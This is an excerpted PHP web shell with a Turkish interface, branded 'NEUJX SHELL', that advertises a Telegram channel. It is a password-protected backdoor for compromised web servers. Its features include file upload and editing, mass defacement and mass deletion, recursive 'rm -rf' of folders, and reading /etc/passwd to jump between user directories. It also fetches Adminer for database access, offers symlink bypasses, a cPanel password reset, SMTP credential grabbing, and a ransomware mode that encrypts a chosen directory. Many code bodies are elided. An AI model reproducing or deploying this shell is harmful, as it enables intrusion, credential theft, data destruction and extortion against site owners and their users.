...
/* Configurasi */
$auth_pass 		= "4a9237545e7e6da7bf0c47e4be57f86c";//
$color 			= "#00ff00";
...
<html>
	<head>
		...
		<meta name="author" content="neujx"/>
		<title>HACKED BY NEUJX - t.me/neuhasus</title>
		<link rel='icon' type='image/png' href='https://cdn.discordapp.com/attachments/1006144051613016157/1042036729865044070/AliRoswellPP.png'/>
			...
			<div class="container" style="margin-top: 15%">
				<div class="col-lg-6">
					<div class="form-group">
						<h5 class="text-center pb-5">HACKED BY NEUJX - t.me/neuhasus</h5>
						<form method="post">
							<input type="password" name="pass" placeholder="Hacked IP" class="form-control"><br/>
							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
						</form>
					</div>
				</div><a href="https://t.me/neuhasus/" class="text-muted fixed-bottom">Copyright 2023 @ HACKED BY NEUJX - t.me/neuhasus</a><br/>
			</div>
		</center>
...
<html>
	<head>
		...
		<meta name="copyright" content="NEUJX SHELL"/>
		<link rel="icon" type="image/png" href="https://www.indsc.me/images/logo.png"/>
		<title> NEUJX TÜRKÇE SHELL - t.me/neuhasus </title>
...
.html(filenames.join(","));
		...
		<nav class="navbar static-top navbar-dark">
			...
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<a href="https://t.me/neuhasus" class="lain"><i class="fa fa-telegram tambah"></i></a>
				</ul>
			</div>
		</nav>
		<?php
		echo '
		<div class="container">
			<h1 class="text-center"><a href="https://t.me/neuhasus/" style="color:#ffffff;">NEUHASUS TÜRKÇE SHELL</h1>
			<center><h5>Shell Backdor</a></h5></center>
			<hr/>
			<div class="text-center">
				<div class="d-flex justify-content-center flex-wrap">
					<a href="?" class="fiture btn btn-danger btn-sm"><i class="fa fa-home"></i> Anasayfa</a>
					<a href="?dir='.$dir.'&aksi=upload" class="fiture btn btn-danger btn-sm"><i class="fa fa-upload"></i> Upload</a>
					<a href="?dir='.$dir.'&aksi=buat_file" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus-circle"></i> Dosya Oluştur</a>
					<a href="?dir='.$dir.'&aksi=buat_folder" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Klasör Oluştur</a>
					<a href="?dir='.$dir.'&aksi=masdef" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Toplu Tahrif</a>
					<a href="?dir='.$dir.'&aksi=masdel" class="fiture btn btn-danger btn-sm"><i class="fa fa-trash"></i> Toplu Silme</a>
					...
					<a href="?dir='.$dir.'&aksi=adminer" class="fiture btn btn-danger btn-sm"><i class="fa fa-user"></i> Admin</a>
					...
					<a href="?dir='.$dir.'&aksi=ransom" class="fiture btn btn-warning btn-sm"><i class="fab fa-keycdn"></i> Şifrele</a>
					...
					<a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> Hakkımızda</a>
					<a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> Çıkış</a>
				</div>
			</div>
			<div class="row">
				<div class="col-lg-4"><br/>
					...
					<h5><i class="fa fa-search"></i> Info</h5>
		...
		if (isset($_GET['about'])) {
			echo '<div class="card text-center bg-light about">
				<h4 class="card-header">{ NEUJX SHELL }</h4>
				<div class="card-body">
					<center><div class="img"></div></center>
					<p class="card-text">{ NEUJX SHELL } TR BASMA OGLUM SIKERLER HEPIMIZI.</p>
				</div>
				<div class="card-footer">
					<p class="card-text"><small class="text-muted">Copyright 2023 NEUJX TÜRKÇE SHELL - t.me/neuhasus</small></p>
				</div>
			</div><br/>';
			exit;
		}
		...
		if ($_GET['aksi'] == 'upload') {
			...
			if(isset($_POST['upload'])){
				...
				if($uplo){
					echo '<script>alert("Yükleme Başarılı '.$countfiles.' File");</script>';
				}else{
					echo '<script>alert("Yükleme Başarısız!!!");</script>';
				}
			}
		}
		...
		if ($_GET['aksi'] == 'buat_file') {
			...
			if (isset($_POST['bikin'])) {
				...
				if (fwrite($handle, $isi_file)) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Başarıyla Dosya Oluşturuldu");</script>';
				}else{ 
					echo '<script>alert("Dosya Oluşturulamadı");</script>';
				}
			}
		}
		...
		*/
		if($_GET['aksi'] == 'edit') {
			...
			if(isset($_POST['edit_file'])) {
				...
				if ($hasil) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Güncelleme Başarılı!!");</script>';
				}else{
		...
		*/
		if($_GET['aksi'] == 'rename') {
			...
			echo "<form method='POST'>
				...
				<input type='text' class='form-control' name='namanew' autocomplete='off' placeholder='Yeni İsim Girin...'><br/>
			...
			if(isset($_POST['rename_file'])) {
				...
				rename( $baru, $lama);
				if(file_exists($baru)) {
					echo '<script>alert("İsim '.$baru.' Kullanılıyor");</script>';
				}else{
					if(rename( $lama, $baru)) {
						echo '<script>window.location="?dir='.$dir.'"; alert("İsim Değiştirme Başarılı '.$baru.'");</script>';
					}else{
						echo '<script>alert("Yeniden adlandırma başarısız!!!");</script>';
					}
				}
			}
		}
		...
		*/
		if ($_GET['aksi'] == 'hapusf') {
			...
			<div class='card card-body'>
				<center><br/>
					<font color='black'>Silinsin mi ? : $nama</font>
				</center><br/><br/>
				<form method='POST'>
					<a class='btn btn-danger btn-block' href='?dir=$dir'>Hayır</a>
					<input type='submit' name='ya' class='float-right btn btn-success btn-success btn-block' value='Evet'>
				</form>
			</div><br/>";
			echo $output;
			...
			if ($_POST['ya']) {
				$hapus = unlink($file);
				if ($hapus) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Dosya başasıyla silindi");</script>';
				}else{
					echo '<script>alert("Dosyayı silemedik amk!");</script>';
				}
			}
		}
		...
		*/
		if ($_GET['aksi'] == 'buat_folder' ) {
			$output = "
			<h4><img src='http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png' class='ico'></img></i> Klasör Oluştur: </h4>
			<form method='POST'>
				<input type='text' class='form-control' name='nama_folder' autocomplete='off' placeholder='Klasör adı...'><br/>
				<button type='sumbit' class='btn btn-info btn-block' name='buat'>Oluştur!!</button>
			</form>";
			echo $output;
			...
			if (isset($_POST['buat'])) {
				...
				$fd = mkdir ($folder);
				if ($fd) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Klasör Başarıyla Oluşturuldu '.$folder.'");</script>';
				}else{
					echo "echo '<script> alert('Folder ".$folder." Klasör Oluşturulamadı!!');</script>";
				}
			}
		}
		...
		*/
		if ($_GET['aksi'] == 'hapus_folder' ) {
			...
			$output ="
			[ <a href='?dir=".$dir."&aksi=rename_folder'>Yeniden Adlandır</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'>Sil</a> ] 
			<div class='card container'>
				<center><br/>
					<font color='black'>Silmek istediğine emin misin : $nama ?
				</center><br/><br/>
				<form method='POST'>
					<a class='btn btn-danger btn-block' href='?dir=".dirname($dir)."'>Hayır</a>
					<input type='submit' name='ya' class='float-right btn btn-success btn-block' value='  Evet  '>
				</form><br/><br/>
			</div><br/>";
			echo $output;
			...
			if ($_POST['ya']) {
				if(is_dir($dir)) {
					if(is_writable($dir)) {
						...
						@exe("rm -rf $dir");
						@exe("rmdir /s /q $dir");
						echo "<script>window.location='?dir=".dirname($dir)."'; alert('Başarıyla silindi ".$nama."');</script>";
					} else {
						echo "<script>window.location='?dir=".dirname($dir)."'; alert('Silemedik amk!! ".$nama."');</script>";
					}
				}
			}
		exit;
		...
		*/
		if ($_GET['aksi'] == 'rename_folder' ) {
			...
			<form method='POST'>
				<input type='text' class='form-control' name='namanew' autocomplete='off' placeholder='Yeni isim girin..'><br/>
				<button type='sumbit' class='btn btn-info btn-block' name='ganti'>Değiştir!!</button><br/>
			</form>";
			echo $output;
			...
			if (isset($_POST['ganti'])) {
				...
				if($ubah) {
					echo "<script>window.location='?dir=".dirname($dir)."'; alert('Yeniden adlandırma başarılı');</script>";
				}else{
					echo "<script>alert('İsm deşişemedik amq!!');</script>" ;
				}
			}
			exit;
		}
		...
		*/
		if($_GET['aksi'] == 'masdel') {
			...
			if($_POST['start']) {
				...
				echo "<form method='post'>
					<h5><i class='fa fa-folder'></i> Konum :</h5>
					<input type='text' name='d_dir' value='$dir' class='form-control'><br>
					<h5><i class ='fa fa-file'></i> Dosya Adı :</h5>
	...
	if($_GET['aksi'] == 'masdef') {
		...
		echo "</textarea><br/>";
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' autocomplete='off' placeholder='[Ex] Hacked By { NEUJX SHELL }'></textarea><br/>
				<input type='submit' name='start' value='Toplu Tehrif' class='btn btn-danger form-control'><br/>
			</form>";
		}
		exit;
	}
	...
	*/
	if($_GET['aksi'] == 'jumping') {
		...
		if(preg_match("/hsphere/", $dir)) {
			...
			echo "<pre>";
			$etc = fopen("/etc/passwd", "r") or die("<font color=red>Okunamıyor /etc/passwd</font><br/>");
			while($passwd = fgets($etc)) {
				if($passwd == '' || !$etc) {
					echo "<font color=red>Okunamıyor/etc/passwd</font><br/>";
				} else {
					...
					foreach($user_jumping[1] as $user_pro_jump) {
						...
						if(is_readable($user_jumping_dir)) {
							...
							if(function_exists('posix_getpwuid')) {
								...
								if($domain_jump == '') {
									echo " => ( <font color=red>alan adını alamıyorum</font> )<br>";
								} else {
...
t.me/neuhasus
	...
	*/
	if($_GET['aksi'] == 'adminer') {
		...
		if(file_exists('adminer.php')) {
			echo "<center><a href='$full/adminer.php' target='_blank'>-> Admin login <-</a></font></center><br/>";
		} else {
			if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
				echo "<center><a href='$full/adminer.php' target='_blank'>-> admin login <-</a></font></center><br/>";
			} else {
				echo "<center><font color=red>admin dosyası oluşturulamadı!!</font></center><br/>";
			}
		}
		exit;
	}
	...
	*/
	if($_GET['aksi'] == 'symlink') {
		...
		if(!$d00m) {
			die ("[ <a href='?dir=$path&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$path&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$path&aksi=sym_bypas'>Symlink Bypass</a> ]<br/><font color='red'>Hata okunamkyor  /etc/named.conf</font><br/><br/>");
		}
		else{
...
t.me/neuhasus
	*/
	if ($_GET['aksi'] == 'resetpasscp') {
		echo '<br/><h5 class="text-center"><i class="fa fa-key"></i> Cpanel Şifre Otomatik Sıfırlama</h5>
		<form method="POST">
			<div class="form-group">
				<input type="email" name="email" class="form-control" placeholder="E-Posta Girin.."/><br/>
				<input type="submit" name="submit" class="btn btn-danger btn-block" value="Gönder!"/>
			</div>
		</form>';
	...
	if ($_GET['aksi'] == 'ransom') {
		echo '<form method="post">
			<div class="form-group">
				<label>Şifrelemek İstediğiniz Dizin..</label>
				<input type="text" name="path" class="form-control mb-2" value="'.$dir.'">
				<input type="submit" name="encrypt" class="btn btn-danger btn-block" value="Şifrele"/>
			</div>
		</form>';
					...
					foreach($ffs as $ff){
						...
						if(!is_dir($files)){
							...
							if($x->status == 'success'){
								...
								echo "[+]$files => Başarıyla Şifrelendi\n";
							}
						}
	...
	if ($_GET['aksi'] == 'smtpgrab') {
		...
		echo "<p class='text-muted'>NB : Bu araçlar bir klasörde çalıştırılırsa çalışır <u>config</u> ( ex: /home/user/public_html/namafolder_config )</p>";
		$smtp = scj($path);
		exit;
	}
	...
	if ($_GET['aksi'] == 'bypascf') {
		echo '<form method="POST"><br>			
			...
			<div class="form-group input-group">
				<input class="form-control" type="text" name="target" placeholder="URL Girin">
		...
		echo '<center><div id="tab"><table class="text-white mt-1 table-hover table-responsive">
			...
			/* klasör şeklinde olup olmadığını kontrol edin */
			/* karakter klasörü adının çok uzun olup olmadığını kontrol edin */
			if (strlen($dir) > 18) {
			...
			foreach($scandir as $file){
				...
				echo '<tr>
					...
					/* karakterlerin çok uzun olup olmadığını kontrol edin */
					if (strlen($file) > 25) {
					...
					<td class="text-center d-flex">
						<a title="Göster" class="badge badge-info" href="?dir='.$path.'&aksi=View&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;
		...
		echo '</table></div><hr/><a href="https://t.me/neuhasus/" class="text-muted">Neujx Shell Copyright 2023</a></center><br/>';	
